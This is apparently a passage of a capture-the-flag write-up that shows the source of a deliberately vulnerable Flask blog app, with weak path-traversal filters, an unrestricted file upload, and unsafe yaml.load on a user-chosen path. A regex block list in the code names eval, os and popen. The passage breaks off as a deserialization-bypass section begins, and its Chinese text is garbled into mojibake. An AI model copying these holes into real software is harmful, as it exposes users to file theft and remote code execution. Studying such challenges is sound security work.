class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">            flash(<span class="string">&quot;ËØ•Áî®Êà∑ÂêçÂ∑≤Â≠òÂú®&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            user = User(username=username, name=name)  </span><br><span class="line">            user.password_hash(password)  </span><br><span class="line">            db.session.add(user)  </span><br><span class="line">            db.session.commit()  </span><br><span class="line">            flash(<span class="string">&quot;Ê≥®ÂÜåÊàêÂäüÔºÅ&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> (user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (check_password_hash(user.password, password)):  </span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username  </span><br><span class="line">            session.permanent = <span class="literal">True</span>  </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;Ë¥¶Âè∑ÊàñÂØÜÁ†ÅÈîôËØØ&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&quot;/updatePwd&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        lodPwd = request.form.get(<span class="string">&quot;lodPwd&quot;</span>)  </span><br><span class="line">        newPwd1 = request.form.get(<span class="string">&quot;newPwd1&quot;</span>)  </span><br><span class="line">        newPwd2 = request.form.get(<span class="string">&quot;newPwd2&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&quot;username&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> check_password_hash(user.password, lodPwd):  </span><br><span class="line">            <span class="keyword">if</span> newPwd1 != newPwd2:  </span><br><span class="line">                flash(<span class="string">&quot;‰∏§Ê¨°Êñ∞ÂØÜÁ†Å‰∏ç‰∏ÄËá¥ÔºÅ&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                user.password_hash(newPwd2)  </span><br><span class="line">                db.session.commit()  </span><br><span class="line">                flash(<span class="string">&quot;‰øÆÊîπÊàêÂäüÔºÅ&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;ÂéüÂØÜÁ†ÅÈîôËØØÔºÅ&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        path = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        path = os.path.join(<span class="string">&#x27;static/upload/&#x27;</span>, path)  </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):  </span><br><span class="line">            <span class="keyword">return</span> send_file(path)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>, file=path)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>,  </span><br><span class="line">                           yaml=<span class="string">&#x27;ÊâÄË∞ì„ÄéÊÅ∂„ÄèÔºåÊòØÈÇ£‰∫õÂè™‰∏∫‰∫ÜËá™Â∑±ÔºåÂà©Áî®ÂíåË∑µË∏èÂº±ËÄÖÁöÑÂÆ∂‰ºôÔºÅ‰ΩÜÊòØÔºåÊàëËôΩÁÑ∂ÊòØËøôÊ†∑Ôºå‰πüÁü•ÈÅì‰ªÄ‰πàÊòØ‰ª§‰∫∫‰ΩúÂëïÁöÑ„ÄéÊÅ∂„ÄèÔºåÊâÄ‰ª•ÔºåÁî±ÊàëÊù•Âà∂Ë£ÅÔºÅ&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():  </span><br><span class="line">    session.clear()  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">//blog.py</span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, session  </span><br><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> Loader  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">blog = Blueprint(<span class="string">&quot;blog&quot;</span>, __name__, url_prefix=<span class="string">&quot;/blog&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):  </span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/writeBlog&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeblog</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;writeBlog.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">        db.session.add(blog)  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.create_time == create_time).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=blog.<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;‰∏ä‰º†ÊàêÂäü!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;‰∏ä‰º†Â§±Ë¥•&#x27;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/showBlog/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showBlog</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    comment = Comment.query.<span class="built_in">filter</span>(Comment.blog_id == blog.<span class="built_in">id</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showBlog.html&quot;</span>, blog=blog, comment=comment)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/blogAll&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blogAll</span>():  </span><br><span class="line">    blogList = Blog.query.order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blogAll.html&#x27;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/update/&lt;id&gt;&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;updateBlog.html&#x27;</span>, blog=blog)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&quot;id&quot;</span>)  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        blog.title = title  </span><br><span class="line">        blog.text = text  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/delete/&lt;id&gt;&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(blog)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;Âà†Èô§ÊàêÂäüÔºÅ&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/myBlog&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myBlog</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    blogList = Blog.query.<span class="built_in">filter</span>(Blog.user_id == user.<span class="built_in">id</span>).order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myBlog.html&quot;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/comment&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>():  </span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>)  </span><br><span class="line">    blogId = request.values.get(<span class="string">&#x27;blogId&#x27;</span>)  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">    db.session.add(comment)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ËØÑËÆ∫ÊàêÂäüÔºÅ&#x27;</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/myComment&#x27;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myComment</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    commentList = Comment.query.<span class="built_in">filter</span>(Comment.user_id == user.<span class="built_in">id</span>).order_by(Comment.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myComment.html&quot;</span>, commentList=commentList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/deleteCom/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteCom</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    com = Comment.query.<span class="built_in">filter</span>(Comment.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(com)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;Âà†Èô§ÊàêÂäüÔºÅ&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥ÔºöÂΩì‰Ω†ÁúãÂà∞ËøôÂè•ËØùÊó∂ÔºåËøòÊ≤°ÊúâÊãøÂà∞flagÔºåÈÇ£Â∞±Ëµ∂Á¥ßÈáçÂºÄÁéØÂ¢ÉÂêß&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥Ôºö‰Ω†ËØ¥Âæó‰∏çÂØπ&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥Ôºö&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁúãÂà∞blog.pyÁöÑ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†ÁöÑË∑ØÁî±</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;‰∏ä‰º†ÊàêÂäü!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;‰∏ä‰º†Â§±Ë¥•&#x27;</span>  </span><br><span class="line">        &#125;  </span><br></pre></td></tr></table></figure><p><strong>yamlÂèçÂ∫èÂàóÂåñÁªïËøá</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;È≤ÅËøÖËØ¥ÔºöÂΩì‰Ω†ÁúãÂà∞ËøôÂè•ËØùÊó∂ÔºåËøòÊ≤°ÊúâÊãøÂà∞flagÔºåÈÇ£Â∞±Ëµ∂Á¥ßÈáçÂºÄÁéØÂ¢ÉÂêß&#x27;</span>)  